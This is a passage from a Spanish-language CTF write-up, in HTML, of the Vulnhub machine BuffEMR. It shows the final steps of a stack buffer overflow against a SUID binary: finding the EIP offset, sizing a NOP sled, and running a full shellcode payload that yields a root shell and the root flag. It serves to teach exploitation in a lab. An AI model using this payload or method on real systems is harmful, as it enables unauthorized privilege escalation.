+<div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true"></a><span class="ex">gef</span>➤  pattern offset <span class="va">$eip</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true"></a>[<span class="ex">+</span>] Searching for <span class="st">&#39;64616166&#39;</span>/<span class="st">&#39;66616164&#39;</span> with period=4</span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true"></a>[<span class="ex">+</span>] Found at offset 512 (little-endian search) <span class="ex">likely</span></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true"></a><span class="ex">gef</span>➤  </span></code></pre></div>
+<p>Ahora sabemos que necesitamos <strong>512</strong> caracteres, antes de llegar a sobrescribir el <strong>EIP</strong>.</p>
+<p>Lo podemos comprobar añadiendo <strong>512</strong> “A” y <strong>4</strong> “B”.</p>
+<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true"></a><span class="ex">gef</span>➤  r <span class="va">$(</span><span class="ex">python3</span> -c <span class="st">&#39;print(&quot;A&quot;*512+&quot;B&quot;*4)&#39;</span><span class="va">)</span></span></code></pre></div>
+<p>Como podemos ver, la dirección de memoria del registro <strong>EIP</strong>, ahora vale <strong>0x42424242</strong> (“BBBB” en hexadecimal)</p>
+<img src="Img/Pasted image 20240516175427.png">
+<p>Teniendo ya control del registro <strong>EIP</strong> vamos a ver las protecciones del binario con <strong>checksec</strong>.</p>
+<div class="sourceCode" id="cb40"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true"></a><span class="ex">gef</span>➤  checksec</span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true"></a>[<span class="ex">+</span>] checksec for <span class="st">&#39;/home/pringles/Vulnhub/BuffEMR/content/dontexecute&#39;</span></span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true"></a><span class="ex">Canary</span>                        : ✘ </span>
+<span id="cb40-4"><a href="#cb40-4" aria-hidden="true"></a><span class="ex">NX</span>                            : ✘ </span>
+<span id="cb40-5"><a href="#cb40-5" aria-hidden="true"></a><span class="ex">PIE</span>                           : ✓ </span>
+<span id="cb40-6"><a href="#cb40-6" aria-hidden="true"></a><span class="ex">Fortify</span>                       : ✘ </span>
+<span id="cb40-7"><a href="#cb40-7" aria-hidden="true"></a><span class="ex">RelRO</span>                         : Full</span>
+<span id="cb40-8"><a href="#cb40-8" aria-hidden="true"></a><span class="ex">gef</span>➤  </span></code></pre></div>
+<p>Vemos que el <strong>NX</strong> (None eXecution) está deshabilitado, lo cual nos permite aprovecharnos de la pila <strong>ESP</strong>, para introducir código a bajo nivel <strong>ShellCode</strong>, en lugar de añadir las letras “A” y redirigir el flujo del programa en algún punto del <strong>ESP</strong> para que nos ejecute el <strong>ShellCode</strong>.</p>
+<p>Buscamos un <strong>ShellCode</strong> para que nos ejecute una <strong>/bin/bash</strong> como el propietario ya que el binario es un <strong>SUID</strong>.</p>
+<img src="Img/Pasted image 20240516212854.png">
+<img src="Img/Pasted image 20240516212914.png">
+<p>Pero antes de que ocurra el <strong>Buffer Overflow</strong>, el <strong>Shellcode</strong> será interpretado como cadenas, no es hasta que se logre apuntar a una dirección de memoria del <strong>ESP</strong> que el <strong>Shellcode</strong> será ejecutado, dado que el <strong>NX</strong> está deshabilitado.</p>
+<p>Para rellenar el espacio restante del <strong>ESP</strong> utilizaremos <strong>NOPS</strong> (No operation Code), ya que son instrucciones de procesador que no realizan ninguna operación, para que al llegar al <strong>ShellCode</strong> sea ejecutado.</p>
+<p>Por lo que ahora necesitamos saber cuales son los <strong>NOPS</strong> necesarios, para que junto al <strong>ShellCode</strong> lleguen justo al registro <strong>EIP</strong>.</p>
+<div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true"></a>❯ <span class="bu">echo</span> <span class="st">&quot;512-33&quot;</span> <span class="kw">|</span> <span class="fu">bc</span></span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true"></a><span class="ex">479</span></span></code></pre></div>
+<p>En este caso sabemos que necesitamos <strong>479</strong> NOPS junto al <strong>ShellCode</strong>, para que lleguen antes de comenzar a sobrescribir el <strong>EIP</strong>.</p>
+<img src="Img/Pasted image 20240517083254.png">
+<p>Finalmente lo que quedaría seria conseguir una dirección en donde residen los <strong>NOPS</strong> para así forzar el desplazamiento hasta llegar al <strong>ShellCode</strong> y podernos ejecutar una <strong>/bin/bash</strong> como el propietario, en este caso el usuario <strong>root</strong>.</p>
+<p>Enviamos la data desde el <strong>GDB</strong>.</p>
+<div class="sourceCode" id="cb42"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">r</span> <span class="va">$(</span><span class="ex">python</span> -c <span class="st">&#39;print &quot;\x90&quot;*479 + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot; + &quot;B&quot;*4&#39;</span><span class="va">)</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true"></a><span class="ex">Starting</span> program: /opt/dontexecute <span class="va">$(</span><span class="ex">python</span> -c <span class="st">&#39;print &quot;\x90&quot;*479 + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot; + &quot;B&quot;*4&#39;</span><span class="va">)</span></span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true"></a></span>
+<span id="cb42-4"><a href="#cb42-4" aria-hidden="true"></a><span class="ex">Program</span> received signal SIGSEGV, Segmentation fault.</span>
+<span id="cb42-5"><a href="#cb42-5" aria-hidden="true"></a><span class="ex">0x42424242</span> in ?? ()</span>
+<span id="cb42-6"><a href="#cb42-6" aria-hidden="true"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span></span></code></pre></div>
+<p>Y ahora miramos el contenido del <strong>ESP</strong>.</p>
+<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/500wx</span> <span class="va">$esp</span></span></code></pre></div>
+<p>Como podemos observar, en el <strong>ESP</strong> residen los <strong>NOPS</strong> que hemos enviado junto al <strong>ShellCode</strong>.</p>
+<img src="Img/Pasted image 20240517085844.png">
+<p>Por tanto ahora el objetivo es que el registro <strong>EIP</strong> en lugar de valer <strong>\x42\x42\x42\x42</strong>, valga una de las direcciones en las cuales residen los <strong>NOPS</strong>.</p>
+<div class="sourceCode" id="cb44"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true"></a><span class="ex">0xffffd530</span>: 0x90909090  0x90909090  0x90909090  0x90909090</span></code></pre></div>
+<p>Pero antes de seguir, como estamos en un binario de 32 bits, vamos a pasar la dirección a <strong>Little-Endian</strong>, simplemente dándole la vuelta a la dirección.</p>
+<div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true"></a>\<span class="ex">x30</span>\xd5\xff\xff</span></code></pre></div>
+<img src="Img/Pasted image 20240517093313.png">
+<p>Al enviar los datos, teniendo en el registro <strong>EIP</strong> una de las direcciones de los <strong>NOPS</strong>, observamos que nos interpreta el <strong>ShellCode</strong> ejecutándonos una <strong>bash</strong> como el propietario.</p>
+<div class="sourceCode" id="cb46"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:~$ /opt/dontexecute <span class="va">$(</span><span class="ex">python</span> -c <span class="st">&#39;print &quot;\x90&quot;*479 + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot; + &quot;\x30\xd5\xff\xff&quot;&#39;</span><span class="va">)</span></span>
+<span id="cb46-2"><a href="#cb46-2" aria-hidden="true"></a><span class="ex">bash-4.4</span># whoami</span>
+<span id="cb46-3"><a href="#cb46-3" aria-hidden="true"></a><span class="ex">root</span></span>
+<span id="cb46-4"><a href="#cb46-4" aria-hidden="true"></a><span class="ex">bash-4.4</span># </span></code></pre></div>
+<p>Y ya finalmente obtenemos la ultima flag.</p>
+<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true"></a><span class="ex">root@buffemr</span>:~# cat Root_flag.txt </span>
+<span id="cb47-2"><a href="#cb47-2" aria-hidden="true"></a>                                                                                                                                          </span>
+<span id="cb47-3"><a href="#cb47-3" aria-hidden="true"></a>                                                                                                                                            </span>
+<span id="cb47-4"><a href="#cb47-4" aria-hidden="true"></a><span class="ex">________</span>                __  __                       ____                                  _____                                        ___ </span>
+<span id="cb47-5"><a href="#cb47-5" aria-hidden="true"></a><span class="kw">`</span><span class="ex">MMMMMMMb.</span>             69MM69MM                     6MMMMb                                69M<span class="kw">`</span><span class="ex">MM</span>                                        <span class="kw">`</span><span class="ex">MM</span> </span>
+<span id="cb47-6"><a href="#cb47-6" aria-hidden="true"></a> <span class="ex">MM</span>    <span class="kw">`</span>Mb            6M<span class="st">&#39; 6M&#39;</span> <span class="kw">`</span>                    <span class="ex">8P</span>    Y8                              6M<span class="st">&#39; `MM                                         MM </span></span>
+<span id="cb47-7"><a href="#cb47-7" aria-hidden="true"></a><span class="st"> MM     MM ___   ___ _MM__MM______  ___  __       6M      Mb ____    ___  ____  ___  __ _MM__ MM   _____  ____    _    ___  ____     ____MM </span></span>
+<span id="cb47-8"><a href="#cb47-8" aria-hidden="true"></a><span class="st"> MM    .M9 `MM    MM MMMMMMMM6MMMMb `MM 6MM       MM      MM `MM(    )M&#39;</span> 6MMMMb <span class="kw">`</span>MM 6MM MMMMM MM  6MMMMMb <span class="kw">`</span><span class="ex">MM</span>(   ,M.   )<span class="ex">M</span><span class="st">&#39; 6MMMMb   6MMMMMM </span></span>
+<span id="cb47-9"><a href="#cb47-9" aria-hidden="true"></a><span class="st"> MMMMMMM(   MM    MM  MM  MM6M&#39;</span>  <span class="kw">`</span>Mb MM69 <span class="st">&quot;       MM      MM  </span><span class="kw">`</span><span class="ex">Mb</span>    d<span class="st">&#39; 6M&#39;</span>  <span class="kw">`</span><span class="st">Mb MM69 &quot;</span>  MM   MM 6M<span class="st">&#39;   `Mb `Mb   dMb   d&#39;</span> 6M<span class="st">&#39;  `Mb 6M&#39;</span>  <span class="kw">`</span><span class="ex">MM</span> </span>
+<span id="cb47-10"><a href="#cb47-10" aria-hidden="true"></a> <span class="ex">MM</span>    <span class="kw">`</span>Mb  MM    MM  MM  MMMM    MM MM<span class="st">&#39;          MM      MM   YM.  ,P  MM    MM MM&#39;</span>     MM   MM MM     MM  YM. ,PYM. ,P  MM    MM MM    MM </span>
+<span id="cb47-11"><a href="#cb47-11" aria-hidden="true"></a> <span class="ex">MM</span>     MM  MM    MM  MM  MMMMMMMMMM MM           MM      MM    MM  M   MMMMMMMM MM      MM   MM MM     MM  <span class="kw">`</span><span class="ex">Mb</span> d<span class="st">&#39;`Mb d&#39;</span>  MMMMMMMM MM    MM </span>
+<span id="cb47-12"><a href="#cb47-12" aria-hidden="true"></a> <span class="ex">MM</span>     MM  MM    MM  MM  MMMM       MM           YM      M9    <span class="kw">`</span>Mbd<span class="st">&#39;   MM       MM      MM   MM MM     MM   YM,P  YM,P   MM       MM    MM </span></span>
+<span id="cb47-13"><a href="#cb47-13" aria-hidden="true"></a><span class="st"> MM    .M9  YM.   MM  MM  MMYM    d9 MM            8b    d8      YMP    YM    d9 MM      MM   MM YM.   ,M9   `MM&#39;</span>  <span class="kw">`</span><span class="ex">MM</span><span class="st">&#39;   YM    d9 YM.  ,MM </span></span>
+<span id="cb47-14"><a href="#cb47-14" aria-hidden="true"></a><span class="st">_MMMMMMM9&#39;</span>   YMMM9MM__MM__MM_YMMMM9 _MM_            YMMMM9        M      YMMMM9 _MM_    _MM_ _MM_ YMMMMM9     YP    YP     YMMMM9   YMMMMMM_</span>
+<span id="cb47-15"><a href="#cb47-15" aria-hidden="true"></a>                                                                                                                                            </span>
+<span id="cb47-16"><a href="#cb47-16" aria-hidden="true"></a>                                                                                                                                            </span>
+<span id="cb47-17"><a href="#cb47-17" aria-hidden="true"></a>                                                                                                                                            </span>
+<span id="cb47-18"><a href="#cb47-18" aria-hidden="true"></a>                                                                                                                                            </span>
+<span id="cb47-19"><a href="#cb47-19" aria-hidden="true"></a>                                                                                                                                            </span>
+<span id="cb47-20"><a href="#cb47-20" aria-hidden="true"></a><span class="ex">________</span>                                           ___        8   8                                                                         </span>
+<span id="cb47-21"><a href="#cb47-21" aria-hidden="true"></a><span class="kw">`</span>MMMMMMMb.                                         <span class="kw">`</span><span class="ex">MM</span>       (M) <span class="kw">(</span><span class="ex">M</span><span class="kw">)</span>                                                                        </span>
+<span id="cb47-22"><a href="#cb47-22" aria-hidden="true"></a> <span class="ex">MM</span>    <span class="kw">`</span>Mb                      /                   MM       (M) <span class="kw">(</span><span class="ex">M</span><span class="kw">)</span>                                                                        </span>
+<span id="cb47-23"><a href="#cb47-23" aria-hidden="true"></a> <span class="ex">MM</span>     MM   _____     _____   /M      ____     ____MM       (M) <span class="kw">(</span><span class="ex">M</span><span class="kw">)</span>                                                                        </span>
+<span id="cb47-24"><a href="#cb47-24" aria-hidden="true"></a> <span class="ex">MM</span>     MM  6MMMMMb   6MMMMMb /MMMMM  6MMMMb   6MMMMMM        M   M                                                                         </span>
+<span id="cb47-25"><a href="#cb47-25" aria-hidden="true"></a> <span class="ex">MM</span>    .M9 6M<span class="st">&#39;   `Mb 6M&#39;</span>   <span class="kw">`</span><span class="ex">Mb</span> MM    6M<span class="st">&#39;  `Mb 6M&#39;</span>  <span class="kw">`</span>MM        M   M                                                                         </span>
+<span id="cb47-26"><a href="#cb47-26" aria-hidden="true"></a> <span class="ex">MMMMMMM9</span><span class="st">&#39; MM     MM MM     MM MM    MM    MM MM    MM        M   M                                                                         </span></span>
+<span id="cb47-27"><a href="#cb47-27" aria-hidden="true"></a><span class="st"> MM  \M\   MM     MM MM     MM MM    MMMMMMMM MM    MM        8   8                                                                         </span></span>
+<span id="cb47-28"><a href="#cb47-28" aria-hidden="true"></a><span class="st"> MM   \M\  MM     MM MM     MM MM    MM       MM    MM                                                                                      </span></span>
+<span id="cb47-29"><a href="#cb47-29" aria-hidden="true"></a><span class="st"> MM    \M\ YM.   ,M9 YM.   ,M9 YM.  ,YM    d9 YM.  ,MM       68b 68b                                                                        </span></span>
+<span id="cb47-30"><a href="#cb47-30" aria-hidden="true"></a><span class="st">_MM_    \M\_YMMMMM9   YMMMMM9   YMMM9 YMMMM9   YMMMMMM_      Y89 Y89  </span></span>
+<span id="cb47-31"><a href="#cb47-31" aria-hidden="true"></a></span>
+<span id="cb47-32"><a href="#cb47-32" aria-hidden="true"></a></span>
+<span id="cb47-33"><a href="#cb47-33" aria-hidden="true"></a><span class="st">COngratulations !!! Tweet me at @san3ncrypt3d ! </span></span>
+<span id="cb47-34"><a href="#cb47-34" aria-hidden="true"></a></span>
+<span id="cb47-35"><a href="#cb47-35" aria-hidden="true"></a></span>
+<span id="cb47-36"><a href="#cb47-36" aria-hidden="true"></a></span>
+<span id="cb47-37"><a href="#cb47-37" aria-hidden="true"></a><span class="st">root@buffemr:~#</span></span></code></pre></div>
+
+
+<p>Aqui se explica con detalle el <a class="link" href="https://github.com/MrPr1ngl3s/AutoPWN/tree/main/Vulnhub/BuffEMR" target="_blank">AutoPWN</a> de la máquina BuffEMR.</p>
+
+
+
+<hr />
+<p>© <script>document.write(new Date().getFullYear());</script> - Mr. Pr1ngl3s</p>
+
+    
+    
+  </div>
+</body>
+</html>
